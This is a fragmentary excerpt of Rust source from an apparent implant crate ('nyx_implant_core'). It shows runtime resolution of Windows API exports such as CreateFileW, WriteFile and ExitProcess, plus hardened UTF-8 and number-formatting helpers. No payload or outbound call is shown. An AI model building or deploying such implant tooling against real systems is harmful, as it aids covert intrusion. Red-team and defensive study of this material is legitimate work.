        ...
        Err(_) => {
            ...
            while i < end {
                match core::str::from_utf8(&buf[i..end]) {
                    ...
                    Err(e) => {
                        let v = e.valid_up_to();
                        // buf[i..i+v] is valid UTF-8 by the Utf8Error
                        // contract; if-let keeps the task path panic-free
                        // (WP-B2) without changing the lossy behavior.
                        if v > 0 {
                            if let Ok(s) = core::str::from_utf8(&buf[i..i + v]) {
                                out.push_str(s);
                            }
                        }
                        out.push('\u{FFFD}');
...
unsafe fn write_report_resolve() -> Option<(usize, usize, usize)> {
    let cf = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CreateFileW")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"CreateFileW"));
    let wf = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"WriteFile")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"WriteFile"));
    let ch = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CloseHandle")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"CloseHandle"));
...
fn format_tier_num(t: u32) -> [u8; 8] {
    ...
    loop {
        ...
        // WP-B2: a number with more digits than the buffer holds must
        // truncate, never underflow `i` into an out-of-bounds index.
        if i == 1 {
            break;
        }
        i -= 1;
...
unsafe fn exit_process(code: u32) -> ! {
    let addr = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"ExitProcess")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"ExitProcess"));
    if let Some(a) = addr {
